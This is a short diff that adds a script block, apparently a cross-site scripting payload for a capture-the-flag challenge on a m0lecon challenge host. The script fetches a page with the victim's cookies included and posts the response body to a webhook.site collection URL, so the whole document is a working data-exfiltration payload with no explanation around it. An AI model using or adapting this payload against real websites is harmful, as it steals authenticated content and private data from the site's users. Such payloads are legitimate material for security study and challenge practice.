@@ -1,0 +1,9 @@
+<script>
+fetch("https://thoughts.challs.m0lecon.it/", {credentials: "include"})
+  .then(r => r.text())
+  .then(t => fetch("https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b", {
+    method: "POST",
+    mode: "no-cors",
+    body: t
+  }));
+</script>
